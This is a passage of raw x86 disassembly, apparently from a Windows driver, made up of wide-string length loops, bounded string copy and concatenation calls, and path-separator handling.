   127a2:	lea    edx,[eax+0x2]
   127a5:	mov    cx,WORD PTR [eax]
   127a8:	inc    eax
   127a9:	inc    eax
   127aa:	test   cx,cx
   127ad:	jne    0x127a5
   127af:	sub    eax,edx
   127b1:	sar    eax,1
   127b3:	jmp    0x127b7
   127b5:	mov    eax,ebx
   127b7:	push   eax
   127b8:	lea    eax,[ebp-0x21c]
   127be:	push   eax
   127bf:	lea    eax,[ebp-0x424]
   127c5:	push   eax
   127c6:	call   DWORD PTR ds:0x1b194
   127cc:	add    esp,0xc
   127cf:	lea    eax,[ebp-0x424]
   127d5:	push   0x1a634
   127da:	push   eax
   127db:	call   DWORD PTR ds:0x1b1c8
   127e1:	mov    esi,eax
   127e3:	test   esi,esi
   127e5:	pop    ecx
   127e6:	pop    ecx
   127e7:	je     0x12962
   127ed:	mov    ax,WORD PTR [esi+0x8]
   127f1:	mov    WORD PTR [ebp-0xc],ax
   127f5:	lea    eax,[ebp-0x638]
   127fb:	push   eax
   127fc:	lea    eax,[ebp-0x14]
   127ff:	push   eax
   12800:	call   0x122b2
   12805:	test   eax,eax
   12807:	jne    0x12962
   1280d:	push   0x208
   12812:	push   eax
   12813:	lea    eax,[ebp-0x21c]
   12819:	push   eax
   1281a:	call   0x1a1b0
   1281f:	mov    eax,DWORD PTR [ebp-0x634]
   12825:	add    esp,0xc
   12828:	lea    edx,[eax+0x2]
   1282b:	mov    cx,WORD PTR [eax]
   1282e:	inc    eax
   1282f:	inc    eax
   12830:	test   cx,cx
   12833:	jne    0x1282b
   12835:	sub    eax,edx
   12837:	sar    eax,1
   12839:	cmp    eax,ebx
   1283b:	jae    0x12856
   1283d:	mov    eax,DWORD PTR [ebp-0x634]
   12843:	lea    edx,[eax+0x2]
   12846:	mov    cx,WORD PTR [eax]
   12849:	inc    eax
   1284a:	inc    eax
   1284b:	test   cx,cx
   1284e:	jne    0x12846
   12850:	sub    eax,edx
   12852:	sar    eax,1
   12854:	jmp    0x12858
   12856:	mov    eax,ebx
   12858:	push   eax
   12859:	push   DWORD PTR [ebp-0x634]
   1285f:	lea    eax,[ebp-0x21c]
   12865:	push   eax
   12866:	call   DWORD PTR ds:0x1b194
   1286c:	lea    edi,[esi+0xc]
   1286f:	mov    eax,edi
   12871:	add    esp,0xc
   12874:	lea    ecx,[eax+0x2]
   12877:	mov    dx,WORD PTR [eax]
   1287a:	inc    eax
   1287b:	inc    eax
   1287c:	test   dx,dx
   1287f:	jne    0x12877
   12881:	sub    eax,ecx
   12883:	sar    eax,1
   12885:	mov    esi,eax
   12887:	lea    eax,[ebp-0x21c]
   1288d:	lea    edx,[eax+0x2]
   12890:	mov    cx,WORD PTR [eax]
   12893:	inc    eax
   12894:	inc    eax
   12895:	test   cx,cx
   12898:	jne    0x12890
   1289a:	sub    eax,edx
   1289c:	sar    eax,1
   1289e:	mov    ecx,ebx
   128a0:	sub    ecx,eax
   128a2:	cmp    esi,ecx
   128a4:	jae    0x128bb
   128a6:	mov    eax,edi
   128a8:	lea    edx,[eax+0x2]
   128ab:	mov    cx,WORD PTR [eax]
   128ae:	inc    eax
   128af:	inc    eax
   128b0:	test   cx,cx
   128b3:	jne    0x128ab
   128b5:	sub    eax,edx
   128b7:	sar    eax,1
   128b9:	jmp    0x128d8
   128bb:	lea    eax,[ebp-0x21c]
   128c1:	lea    edx,[eax+0x2]
   128c4:	mov    cx,WORD PTR [eax]
   128c7:	inc    eax
   128c8:	inc    eax
   128c9:	test   cx,cx
   128cc:	jne    0x128c4
   128ce:	sub    eax,edx
   128d0:	sar    eax,1
   128d2:	mov    ecx,eax
   128d4:	mov    eax,ebx
   128d6:	sub    eax,ecx
   128d8:	push   eax
   128d9:	lea    eax,[ebp-0x21c]
   128df:	push   edi
   128e0:	push   eax
   128e1:	call   DWORD PTR ds:0x1b190
   128e7:	add    esp,0xc
   128ea:	xor    esi,esi
   128ec:	push   esi
   128ed:	push   DWORD PTR [ebp-0x634]
   128f3:	call   DWORD PTR ds:0x1b278
   128f9:	push   0x208
   128fe:	lea    eax,[ebp-0x424]
   12904:	push   esi
   12905:	push   eax
   12906:	mov    DWORD PTR [ebp-0x634],esi
   1290c:	call   0x1a1b0
   12911:	lea    eax,[ebp-0x21c]
   12917:	add    esp,0xc
   1291a:	lea    ecx,[eax+0x2]
   1291d:	mov    dx,WORD PTR [eax]
   12920:	inc    eax
   12921:	inc    eax
   12922:	cmp    dx,si
   12925:	jne    0x1291d
   12927:	sub    eax,ecx
   12929:	sar    eax,1
   1292b:	cmp    eax,ebx
   1292d:	jae    0x12948
   1292f:	lea    eax,[ebp-0x21c]
   12935:	lea    edx,[eax+0x2]
   12938:	mov    cx,WORD PTR [eax]
   1293b:	inc    eax
   1293c:	inc    eax
   1293d:	cmp    cx,si
   12940:	jne    0x12938
   12942:	sub    eax,edx
   12944:	sar    eax,1
   12946:	jmp    0x1294a
   12948:	mov    eax,ebx
   1294a:	push   eax
   1294b:	lea    eax,[ebp-0x21c]
   12951:	push   eax
   12952:	lea    eax,[ebp-0x424]
   12958:	push   eax
   12959:	call   DWORD PTR ds:0x1b194
   1295f:	add    esp,0xc
   12962:	lea    eax,[ebp-0x424]
   12968:	push   0x1a61a
   1296d:	push   eax
   1296e:	call   DWORD PTR ds:0x1b1c8
   12974:	mov    edi,eax
   12976:	test   edi,edi
   12978:	pop    ecx
   12979:	pop    ecx
   1297a:	je     0x12af4
   12980:	lea    eax,[ebp-0x424]
   12986:	cmp    edi,eax
   12988:	jne    0x12af4
   1298e:	add    edi,0x16
   12991:	cmp    BYTE PTR ds:0x1bf8e,0x0
   12998:	je     0x12af4
   1299e:	mov    esi,DWORD PTR ds:0x1c78c
   129a4:	test   esi,esi
   129a6:	je     0x12af4
   129ac:	mov    eax,esi
   129ae:	lea    edx,[eax+0x2]
   129b1:	mov    cx,WORD PTR [eax]
   129b4:	inc    eax
   129b5:	inc    eax
   129b6:	test   cx,cx
   129b9:	jne    0x129b1
   129bb:	sub    eax,edx
   129bd:	sar    eax,1
   129bf:	je     0x12af4
   129c5:	push   0x208
   129ca:	lea    eax,[ebp-0x21c]
   129d0:	push   0x0
   129d2:	push   eax
   129d3:	call   0x1a1b0
   129d8:	mov    eax,esi
   129da:	add    esp,0xc
   129dd:	lea    edx,[eax+0x2]
   129e0:	mov    cx,WORD PTR [eax]
   129e3:	inc    eax
   129e4:	inc    eax
   129e5:	test   cx,cx
   129e8:	jne    0x129e0
   129ea:	sub    eax,edx
   129ec:	sar    eax,1
   129ee:	cmp    eax,ebx
   129f0:	jae    0x12a07
   129f2:	mov    eax,esi
   129f4:	lea    edx,[eax+0x2]
   129f7:	mov    cx,WORD PTR [eax]
   129fa:	inc    eax
   129fb:	inc    eax
   129fc:	test   cx,cx
   129ff:	jne    0x129f7
   12a01:	sub    eax,edx
   12a03:	sar    eax,1
   12a05:	jmp    0x12a09
   12a07:	mov    eax,ebx
   12a09:	push   eax
   12a0a:	lea    eax,[ebp-0x21c]
   12a10:	push   esi
   12a11:	push   eax
   12a12:	call   DWORD PTR ds:0x1b194
   12a18:	mov    eax,edi
   12a1a:	add    esp,0xc
   12a1d:	lea    ecx,[eax+0x2]
   12a20:	mov    dx,WORD PTR [eax]
   12a23:	inc    eax
   12a24:	inc    eax
   12a25:	test   dx,dx
   12a28:	jne    0x12a20
   12a2a:	sub    eax,ecx
   12a2c:	sar    eax,1
   12a2e:	mov    esi,eax
   12a30:	lea    eax,[ebp-0x21c]
   12a36:	lea    edx,[eax+0x2]
   12a39:	mov    cx,WORD PTR [eax]
   12a3c:	inc    eax
   12a3d:	inc    eax
   12a3e:	test   cx,cx
   12a41:	jne    0x12a39
   12a43:	sub    eax,edx
   12a45:	sar    eax,1
   12a47:	mov    ecx,ebx
   12a49:	sub    ecx,eax
   12a4b:	cmp    esi,ecx
   12a4d:	jae    0x12a64
   12a4f:	mov    eax,edi
   12a51:	lea    edx,[eax+0x2]
   12a54:	mov    cx,WORD PTR [eax]
   12a57:	inc    eax
   12a58:	inc    eax
   12a59:	test   cx,cx
   12a5c:	jne    0x12a54
   12a5e:	sub    eax,edx
   12a60:	sar    eax,1
   12a62:	jmp    0x12a81
   12a64:	lea    eax,[ebp-0x21c]
   12a6a:	lea    edx,[eax+0x2]
   12a6d:	mov    cx,WORD PTR [eax]
   12a70:	inc    eax
   12a71:	inc    eax
   12a72:	test   cx,cx
   12a75:	jne    0x12a6d
   12a77:	sub    eax,edx
   12a79:	sar    eax,1
   12a7b:	mov    ecx,eax
   12a7d:	mov    eax,ebx
   12a7f:	sub    eax,ecx
   12a81:	push   eax
   12a82:	lea    eax,[ebp-0x21c]
   12a88:	push   edi
   12a89:	push   eax
   12a8a:	call   DWORD PTR ds:0x1b190
   12a90:	push   0x208
   12a95:	lea    eax,[ebp-0x424]
   12a9b:	push   0x0
   12a9d:	push   eax
   12a9e:	call   0x1a1b0
   12aa3:	lea    eax,[ebp-0x21c]
   12aa9:	add    esp,0x18
   12aac:	lea    ecx,[eax+0x2]
   12aaf:	mov    dx,WORD PTR [eax]
   12ab2:	inc    eax
   12ab3:	inc    eax
   12ab4:	test   dx,dx
   12ab7:	jne    0x12aaf
   12ab9:	sub    eax,ecx
   12abb:	sar    eax,1
   12abd:	cmp    eax,ebx
   12abf:	jae    0x12ada
   12ac1:	lea    eax,[ebp-0x21c]
   12ac7:	lea    edx,[eax+0x2]
   12aca:	mov    cx,WORD PTR [eax]
   12acd:	inc    eax
   12ace:	inc    eax
   12acf:	test   cx,cx
   12ad2:	jne    0x12aca
   12ad4:	sub    eax,edx
   12ad6:	sar    eax,1
   12ad8:	jmp    0x12adc
   12ada:	mov    eax,ebx
   12adc:	push   eax
   12add:	lea    eax,[ebp-0x21c]
   12ae3:	push   eax
   12ae4:	lea    eax,[ebp-0x424]
   12aea:	push   eax
   12aeb:	call   DWORD PTR ds:0x1b194
   12af1:	add    esp,0xc
   12af4:	lea    eax,[ebp-0x424]
   12afa:	push   0x1a608
   12aff:	push   eax
   12b00:	call   DWORD PTR ds:0x1b1c8
   12b06:	test   eax,eax
   12b08:	pop    ecx
   12b09:	pop    ecx
   12b0a:	je     0x12b1a
   12b0c:	lea    ecx,[ebp-0x424]
   12b12:	cmp    eax,ecx
   12b14:	je     0x12e36
   12b1a:	cmp    WORD PTR [ebp-0x424],0x5c
   12b22:	jne    0x12e36
   12b28:	mov    esi,DWORD PTR [ebp-0x644]
   12b2e:	push   esi
   12b2f:	call   DWORD PTR ds:0x1b130
   12b35:	test   al,al
   12b37:	je     0x12cc3
   12b3d:	cmp    WORD PTR [esi],0x5
   12b41:	jne    0x12cc3
   12b47:	mov    esi,0x400
   12b4c:	push   esi
   12b4d:	push   0x0
   12b4f:	call   DWORD PTR ds:0x1b124
   12b55:	mov    edi,eax
   12b57:	test   edi,edi
   12b59:	je     0x12e36
   12b5f:	push   esi
   12b60:	push   0x0
   12b62:	push   edi
   12b63:	call   0x1a1b0
   12b68:	add    esp,0xc
   12b6b:	lea    eax,[ebp-0x63c]
   12b71:	push   eax
   12b72:	mov    eax,DWORD PTR [ebp-0x644]
   12b78:	push   esi
   12b79:	push   edi
   12b7a:	push   DWORD PTR [eax+0x4]
   12b7d:	call   DWORD PTR ds:0x1b198
   12b83:	test   eax,eax
   12b85:	jne    0x12cb5
   12b8b:	push   0x208
   12b90:	push   eax
   12b91:	lea    eax,[ebp-0x21c]
   12b97:	push   eax
   12b98:	call   0x1a1b0
   12b9d:	movzx  eax,WORD PTR [edi]
   12ba0:	mov    ecx,eax
   12ba2:	and    cx,0xfffe
   12ba7:	add    esp,0xc
   12baa:	cmp    cx,0x206
   12baf:	jae    0x12bb8
   12bb1:	movzx  eax,ax
   12bb4:	shr    eax,1
   12bb6:	jmp    0x12bba
   12bb8:	mov    eax,ebx
   12bba:	push   eax
   12bbb:	push   DWORD PTR [edi+0x4]
   12bbe:	lea    eax,[ebp-0x21c]
   12bc4:	push   eax
   12bc5:	call   DWORD PTR ds:0x1b194
   12bcb:	lea    eax,[ebp-0x424]
   12bd1:	add    esp,0xc
   12bd4:	lea    edx,[eax+0x2]
   12bd7:	mov    cx,WORD PTR [eax]
   12bda:	inc    eax
   12bdb:	inc    eax
   12bdc:	test   cx,cx
   12bdf:	jne    0x12bd7
   12be1:	sub    eax,edx
   12be3:	sar    eax,1
   12be5:	mov    esi,eax
   12be7:	lea    eax,[ebp-0x21c]
   12bed:	lea    edx,[eax+0x2]
   12bf0:	mov    cx,WORD PTR [eax]
   12bf3:	inc    eax
   12bf4:	inc    eax
   12bf5:	test   cx,cx
   12bf8:	jne    0x12bf0
   12bfa:	sub    eax,edx
   12bfc:	sar    eax,1
   12bfe:	mov    ecx,ebx
   12c00:	sub    ecx,eax
   12c02:	cmp    esi,ecx
   12c04:	jae    0x12c1f
   12c06:	lea    eax,[ebp-0x424]
   12c0c:	lea    edx,[eax+0x2]
   12c0f:	mov    cx,WORD PTR [eax]
   12c12:	inc    eax
   12c13:	inc    eax
   12c14:	test   cx,cx
   12c17:	jne    0x12c0f
   12c19:	sub    eax,edx
   12c1b:	sar    eax,1
   12c1d:	jmp    0x12c3c
   12c1f:	lea    eax,[ebp-0x21c]
   12c25:	lea    edx,[eax+0x2]
   12c28:	mov    cx,WORD PTR [eax]
   12c2b:	inc    eax
   12c2c:	inc    eax
   12c2d:	test   cx,cx
   12c30:	jne    0x12c28
   12c32:	sub    eax,edx
   12c34:	sar    eax,1
   12c36:	mov    ecx,eax
   12c38:	mov    eax,ebx
   12c3a:	sub    eax,ecx
   12c3c:	push   eax
   12c3d:	lea    eax,[ebp-0x424]
   12c43:	push   eax
   12c44:	lea    eax,[ebp-0x21c]
   12c4a:	push   eax
   12c4b:	call   DWORD PTR ds:0x1b190
   12c51:	push   0x208
   12c56:	lea    eax,[ebp-0x424]
   12c5c:	push   0x0
   12c5e:	push   eax
   12c5f:	call   0x1a1b0
   12c64:	lea    eax,[ebp-0x21c]
   12c6a:	add    esp,0x18
   12c6d:	lea    ecx,[eax+0x2]
   12c70:	mov    dx,WORD PTR [eax]
   12c73:	inc    eax
   12c74:	inc    eax
   12c75:	test   dx,dx
   12c78:	jne    0x12c70
   12c7a:	sub    eax,ecx
   12c7c:	sar    eax,1
   12c7e:	cmp    eax,ebx
   12c80:	jae    0x12c9b
   12c82:	lea    eax,[ebp-0x21c]
   12c88:	lea    edx,[eax+0x2]
   12c8b:	mov    cx,WORD PTR [eax]
   12c8e:	inc    eax
   12c8f:	inc    eax
   12c90:	test   cx,cx
   12c93:	jne    0x12c8b
   12c95:	sub    eax,edx
   12c97:	sar    eax,1
   12c99:	jmp    0x12c9d
   12c9b:	mov    eax,ebx
   12c9d:	push   eax
   12c9e:	lea    eax,[ebp-0x21c]
   12ca4:	push   eax
   12ca5:	lea    eax,[ebp-0x424]
   12cab:	push   eax
   12cac:	call   DWORD PTR ds:0x1b194
   12cb2:	add    esp,0xc
   12cb5:	push   0x0
   12cb7:	push   edi
   12cb8:	call   DWORD PTR ds:0x1b278
   12cbe:	jmp    0x12e36
   12cc3:	cmp    BYTE PTR ds:0x1bf8e,0x0
   12cca:	je     0x12e36
   12cd0:	mov    edi,DWORD PTR ds:0x1c78c
   12cd6:	test   edi,edi
   12cd8:	je     0x12e36
   12cde:	mov    eax,edi
   12ce0:	lea    edx,[eax+0x2]
   12ce3:	mov    cx,WORD PTR [eax]
   12ce6:	inc    eax
   12ce7:	inc    eax
   12ce8:	test   cx,cx
   12ceb:	jne    0x12ce3
   12ced:	sub    eax,edx
   12cef:	sar    eax,1
   12cf1:	mov    DWORD PTR [ebp-0x63c],eax
   12cf7:	je     0x12e36
   12cfd:	xor    ecx,ecx
   12cff:	test   eax,eax
   12d01:	lea    esi,[edi+eax*2-0x2]
   12d05:	jbe    0x12d17
   12d07:	mov    dx,WORD PTR [esi]
   12d0a:	dec    esi
   12d0b:	dec    esi
   12d0c:	cmp    dx,0x5c
   12d10:	je     0x12d17
   12d12:	inc    ecx
   12d13:	cmp    ecx,eax
   12d15:	jb     0x12d07
   12d17:	push   0x208
   12d1c:	lea    eax,[ebp-0x21c]
   12d22:	push   0x0
   12d24:	push   eax
   12d25:	call   0x1a1b0
   12d2a:	sub    esi,edi
   12d2c:	sar    esi,1
   12d2e:	lea    eax,[esi+0x1]
   12d31:	add    esp,0xc
   12d34:	cmp    eax,ebx
   12d36:	jb     0x12d3a
   12d38:	mov    eax,ebx
   12d3a:	push   eax
   12d3b:	lea    eax,[ebp-0x21c]
   12d41:	push   edi
   12d42:	push   eax
   12d43:	call   DWORD PTR ds:0x1b194
   12d49:	lea    eax,[ebp-0x424]
   12d4f:	add    esp,0xc
   12d52:	lea    edx,[eax+0x2]
   12d55:	mov    cx,WORD PTR [eax]
   12d58:	inc    eax
   12d59:	inc    eax
   12d5a:	test   cx,cx
   12d5d:	jne    0x12d55
   12d5f:	sub    eax,edx
   12d61:	sar    eax,1
   12d63:	mov    esi,eax
   12d65:	lea    eax,[ebp-0x21c]
   12d6b:	push   0x2
   12d6d:	lea    edx,[eax+0x2]
   12d70:	pop    edi
   12d71:	mov    cx,WORD PTR [eax]
   12d74:	add    eax,edi
   12d76:	test   cx,cx
   12d79:	jne    0x12d71
   12d7b:	sub    eax,edx
   12d7d:	sar    eax,1
   12d7f:	mov    ecx,ebx
   12d81:	sub    ecx,eax
   12d83:	cmp    esi,ecx
   12d85:	jae    0x12da0
   12d87:	lea    eax,[ebp-0x424]
   12d8d:	lea    edx,[eax+0x2]
   12d90:	mov    cx,WORD PTR [eax]
   12d93:	add    eax,edi
   12d95:	test   cx,cx
   12d98:	jne    0x12d90
   12d9a:	sub    eax,edx
   12d9c:	sar    eax,1
   12d9e:	jmp    0x12dbd
   12da0:	lea    eax,[ebp-0x21c]
   12da6:	lea    edx,[eax+0x2]
   12da9:	mov    cx,WORD PTR [eax]
   12dac:	add    eax,edi
   12dae:	test   cx,cx
   12db1:	jne    0x12da9
   12db3:	sub    eax,edx
   12db5:	sar    eax,1
   12db7:	mov    ecx,eax
   12db9:	mov    eax,ebx
   12dbb:	sub    eax,ecx
   12dbd:	push   eax
   12dbe:	lea    eax,[ebp-0x424]
   12dc4:	push   eax
   12dc5:	lea    eax,[ebp-0x21c]
   12dcb:	push   eax
   12dcc:	call   DWORD PTR ds:0x1b190
   12dd2:	push   0x208
   12dd7:	lea    eax,[ebp-0x424]
   12ddd:	push   0x0
   12ddf:	push   eax
   12de0:	call   0x1a1b0
   12de5:	lea    eax,[ebp-0x21c]
   12deb:	add    esp,0x18
   12dee:	lea    ecx,[eax+0x2]
   12df1:	mov    dx,WORD PTR [eax]
   12df4:	add    eax,edi
   12df6:	test   dx,dx
   12df9:	jne    0x12df1
   12dfb:	sub    eax,ecx
   12dfd:	sar    eax,1
   12dff:	cmp    eax,ebx
   12e01:	jae    0x12e1c
   12e03:	lea    eax,[ebp-0x21c]
   12e09:	lea    edx,[eax+0x2]
   12e0c:	mov    cx,WORD PTR [eax]
   12e0f:	add    eax,edi
   12e11:	test   cx,cx
   12e14:	jne    0x12e0c
   12e16:	sub    eax,edx
   12e18:	sar    eax,1
   12e1a:	jmp    0x12e1e
   12e1c:	mov    eax,ebx
   12e1e:	push   eax
   12e1f:	lea    eax,[ebp-0x21c]
   12e25:	push   eax
   12e26:	lea    eax,[ebp-0x424]
   12e2c:	push   eax
   12e2d:	call   DWORD PTR ds:0x1b194
   12e33:	add    esp,0xc
   12e36:	lea    eax,[ebp-0x424]
   12e3c:	push   0x1a5f2
   12e41:	push   eax
   12e42:	call   DWORD PTR ds:0x1b1c8
   12e48:	mov    edi,eax
   12e4a:	test   edi,edi
   12e4c:	pop    ecx
   12e4d:	pop    ecx
   12e4e:	je     0x13027
   12e54:	lea    eax,[ebp-0x424]
   12e5a:	push   0x1a63e
   12e5f:	push   eax
   12e60:	call   DWORD PTR ds:0x1b1c8
   12e66:	mov    esi,eax
   12e68:	test   esi,esi
   12e6a:	pop    ecx
   12e6b:	pop    ecx
   12e6c:	je     0x13027
   12e72:	mov    eax,edi
   12e74:	sub    eax,esi
   12e76:	and    eax,0xfffffffe
   12e79:	cmp    eax,0x22
   12e7c:	jne    0x13027
   12e82:	push   0x208
   12e87:	lea    eax,[ebp-0x62c]
   12e8d:	push   0x0
   12e8f:	push   eax
   12e90:	add    edi,0x16
   12e93:	call   0x1a1b0
   12e98:	add    esp,0xc
   12e9b:	cmp    WORD PTR [edi],0x5c
   12e9f:	lea    eax,[ebp-0x62c]
   12ea5:	je     0x12ead
   12ea7:	inc    edi
   12ea8:	inc    edi
   12ea9:	push   0x1d
   12eab:	jmp    0x12eaf
   12ead:	push   0x1c
   12eaf:	push   esi
   12eb0:	push   eax
   12eb1:	call   DWORD PTR ds:0x1b194
   12eb7:	add    esp,0xc
   12eba:	lea    eax,[ebp-0x638]
   12ec0:	push   eax
   12ec1:	lea    eax,[ebp-0x62c]
   12ec7:	push   eax
   12ec8:	call   0x122b2
   12ecd:	test   eax,eax
   12ecf:	jne    0x13027
   12ed5:	push   0x208
   12eda:	push   eax
   12edb:	lea    eax,[ebp-0x21c]
   12ee1:	push   eax
   12ee2:	call   0x1a1b0
   12ee7:	mov    eax,DWORD PTR [ebp-0x634]
   12eed:	add    esp,0xc
   12ef0:	lea    edx,[eax+0x2]
   12ef3:	mov    cx,WORD PTR [eax]
   12ef6:	inc    eax
   12ef7:	inc    eax
   12ef8:	test   cx,cx
   12efb:	jne    0x12ef3
   12efd:	sub    eax,edx
   12eff:	sar    eax,1
   12f01:	cmp    eax,ebx
   12f03:	jae    0x12f1e
   12f05:	mov    eax,DWORD PTR [ebp-0x634]
   12f0b:	lea    edx,[eax+0x2]
   12f0e:	mov    cx,WORD PTR [eax]
   12f11:	inc    eax
   12f12:	inc    eax
   12f13:	test   cx,cx
   12f16:	jne    0x12f0e
   12f18:	sub    eax,edx
   12f1a:	sar    eax,1
   12f1c:	jmp    0x12f20
   12f1e:	mov    eax,ebx
   12f20:	push   eax
   12f21:	push   DWORD PTR [ebp-0x634]
   12f27:	lea    eax,[ebp-0x21c]
   12f2d:	push   eax
   12f2e:	call   DWORD PTR ds:0x1b194
   12f34:	mov    eax,edi
   12f36:	add    esp,0xc
   12f39:	lea    ecx,[eax+0x2]
   12f3c:	mov    dx,WORD PTR [eax]
   12f3f:	inc    eax
   12f40:	inc    eax
   12f41:	test   dx,dx
   12f44:	jne    0x12f3c
   12f46:	sub    eax,ecx
   12f48:	sar    eax,1
   12f4a:	mov    esi,eax
   12f4c:	lea    eax,[ebp-0x21c]
   12f52:	lea    edx,[eax+0x2]
   12f55:	mov    cx,WORD PTR [eax]
   12f58:	inc    eax
   12f59:	inc    eax
   12f5a:	test   cx,cx
   12f5d:	jne    0x12f55
   12f5f:	sub    eax,edx
   12f61:	sar    eax,1
   12f63:	mov    ecx,ebx
   12f65:	sub    ecx,eax
   12f67:	cmp    esi,ecx
   12f69:	jae    0x12f80
   12f6b:	mov    eax,edi
   12f6d:	lea    edx,[eax+0x2]
   12f70:	mov    cx,WORD PTR [eax]
   12f73:	inc    eax
   12f74:	inc    eax
   12f75:	test   cx,cx
   12f78:	jne    0x12f70
   12f7a:	sub    eax,edx
   12f7c:	sar    eax,1
   12f7e:	jmp    0x12f9d
   12f80:	lea    eax,[ebp-0x21c]
   12f86:	lea    edx,[eax+0x2]
   12f89:	mov    cx,WORD PTR [eax]
   12f8c:	inc    eax
   12f8d:	inc    eax
   12f8e:	test   cx,cx
   12f91:	jne    0x12f89
   12f93:	sub    eax,edx
   12f95:	sar    eax,1
   12f97:	mov    ecx,eax
   12f99:	mov    eax,ebx
   12f9b:	sub    eax,ecx
   12f9d:	push   eax
   12f9e:	lea    eax,[ebp-0x21c]
   12fa4:	push   edi
   12fa5:	push   eax
   12fa6:	call   DWORD PTR ds:0x1b190
   12fac:	add    esp,0xc
   12faf:	xor    esi,esi
   12fb1:	push   esi
   12fb2:	push   DWORD PTR [ebp-0x634]
   12fb8:	call   DWORD PTR ds:0x1b278
   12fbe:	push   0x208
   12fc3:	lea    eax,[ebp-0x424]
   12fc9:	push   esi
   12fca:	push   eax
   12fcb:	mov    DWORD PTR [ebp-0x634],esi
   12fd1:	call   0x1a1b0
   12fd6:	lea    eax,[ebp-0x21c]
   12fdc:	add    esp,0xc
   12fdf:	lea    ecx,[eax+0x2]
   12fe2:	mov    dx,WORD PTR [eax]
   12fe5:	inc    eax
   12fe6:	inc    eax
   12fe7:	cmp    dx,si
   12fea:	jne    0x12fe2
   12fec:	sub    eax,ecx
   12fee:	sar    eax,1
   12ff0:	cmp    eax,ebx
   12ff2:	jae    0x1300d
   12ff4:	lea    eax,[ebp-0x21c]
   12ffa:	lea    edx,[eax+0x2]
   12ffd:	mov    cx,WORD PTR [eax]
   13000:	inc    eax
   13001:	inc    eax
   13002:	cmp    cx,si
   13005:	jne    0x12ffd
   13007:	sub    eax,edx
   13009:	sar    eax,1
   1300b:	jmp    0x1300f
   1300d:	mov    eax,ebx
   1300f:	push   eax
   13010:	lea    eax,[ebp-0x21c]
   13016:	push   eax
   13017:	lea    eax,[ebp-0x424]
   1301d:	push   eax
   1301e:	call   DWORD PTR ds:0x1b194
   13024:	add    esp,0xc
   13027:	cmp    WORD PTR [ebp-0x21c],0x0
   1302f:	je     0x13077
   13031:	lea    eax,[ebp-0x21c]
   13037:	xor    esi,esi
   13039:	lea    edx,[eax+0x2]
   1303c:	mov    cx,WORD PTR [eax]
   1303f:	inc    eax
   13040:	inc    eax
   13041:	test   cx,cx
   13044:	jne    0x1303c
   13046:	mov    ecx,DWORD PTR [ebp+0xc]
   13049:	sub    eax,edx
   1304b:	sar    eax,1
   1304d:	dec    ecx
   1304e:	cmp    eax,ecx
   13050:	jae    0x1306b
   13052:	lea    eax,[ebp-0x21c]
   13058:	lea    edx,[eax+0x2]
   1305b:	mov    cx,WORD PTR [eax]
   1305e:	inc    eax
   1305f:	inc    eax
   13060:	test   cx,cx
   13063:	jne    0x1305b
   13065:	sub    eax,edx
   13067:	sar    eax,1
   13069:	jmp    0x1306d
   1306b:	mov    eax,ecx
   1306d:	push   eax
   1306e:	lea    eax,[ebp-0x21c]
   13074:	push   eax
   13075:	jmp    0x130d4
   13077:	mov    edi,DWORD PTR [ebp+0x14]
   1307a:	test   edi,edi
   1307c:	mov    esi,0xc0000001
   13081:	je     0x13089
   13083:	mov    eax,edi
   13085:	shr    eax,1
   13087:	jmp    0x130a0
   13089:	mov    eax,DWORD PTR [ebp-0x630]
   1308f:	lea    edx,[eax+0x2]
   13092:	mov    cx,WORD PTR [eax]
   13095:	inc    eax
   13096:	inc    eax
   13097:	test   cx,cx
   1309a:	jne    0x13092
   1309c:	sub    eax,edx
   1309e:	sar    eax,1
   130a0:	mov    ecx,DWORD PTR [ebp+0xc]
   130a3:	dec    ecx
   130a4:	cmp    eax,ecx
   130a6:	jae    0x130cb
   130a8:	test   edi,edi
   130aa:	je     0x130b2
   130ac:	shr    edi,1
   130ae:	mov    eax,edi
   130b0:	jmp    0x130cd
   130b2:	mov    eax,DWORD PTR [ebp-0x630]
   130b8:	lea    edx,[eax+0x2]
   130bb:	mov    cx,WORD PTR [eax]
   130be:	inc    eax
   130bf:	inc    eax
   130c0:	test   cx,cx
   130c3:	jne    0x130bb
   130c5:	sub    eax,edx
   130c7:	sar    eax,1
   130c9:	jmp    0x130cd
   130cb:	mov    eax,ecx
   130cd:	push   eax
   130ce:	push   DWORD PTR [ebp-0x630]
   130d4:	push   DWORD PTR [ebp-0x640]
   130da:	call   DWORD PTR ds:0x1b194
   130e0:	add    esp,0xc
   130e3:	mov    eax,esi
   130e5:	jmp    0x130ec
   130e7:	mov    eax,0xc0000001
   130ec:	mov    ecx,DWORD PTR [ebp-0x4]
   130ef:	pop    edi
   130f0:	pop    esi
   130f1:	xor    ecx,ebp
   130f3:	pop    ebx
   130f4:	call   0x1a164
   130f9:	leave  
   130fa:	ret    0x14
   130fd:	int3   
   130fe:	int3   
   130ff:	int3   
   13100:	int3   
   13101:	int3   
   13102:	mov    edi,edi
   13104:	push   ebp
   13105:	mov    ebp,esp
   13107:	sub    esp,0x628
   1310d:	mov    eax,ds:0x1bb6c
   13112:	xor    eax,ebp
   13114:	mov    DWORD PTR [ebp-0x4],eax
   13117:	mov    eax,DWORD PTR [ebp+0x8]
   1311a:	test   eax,eax
   1311c:	push   esi
   1311d:	mov    esi,DWORD PTR [ebp+0x10]
   13120:	mov    DWORD PTR [ebp-0x628],eax
   13126:	mov    DWORD PTR [ebp-0x624],esi
   1312c:	je     0x13444
   13132:	test   esi,esi
   13134:	je     0x13444
   1313a:	push   edi
   1313b:	mov    edi,0x208
   13140:	push   edi
   13141:	lea    eax,[ebp-0x61c]
   13147:	push   0x0
   13149:	push   eax
   1314a:	call   0x1a1b0
   1314f:	push   edi
   13150:	lea    eax,[ebp-0x20c]
   13156:	push   0x0
   13158:	push   eax
   13159:	call   0x1a1b0
   1315e:	mov    eax,DWORD PTR [ebp+0x14]
   13161:	add    esp,0x18
   13164:	test   eax,eax
   13166:	je     0x1316c
   13168:	shr    eax,1
   1316a:	jmp    0x1317f
   1316c:	mov    eax,esi
   1316e:	lea    edx,[eax+0x2]
   13171:	mov    cx,WORD PTR [eax]
   13174:	inc    eax
   13175:	inc    eax
   13176:	test   cx,cx
   13179:	jne    0x13171
   1317b:	sub    eax,edx
   1317d:	sar    eax,1
   1317f:	push   ebx
   13180:	mov    ebx,0x103
   13185:	cmp    eax,ebx
   13187:	jae    0x131a9
   13189:	mov    eax,DWORD PTR [ebp+0x14]
   1318c:	test   eax,eax
   1318e:	je     0x13194
   13190:	shr    eax,1
   13192:	jmp    0x131ab
   13194:	mov    eax,esi
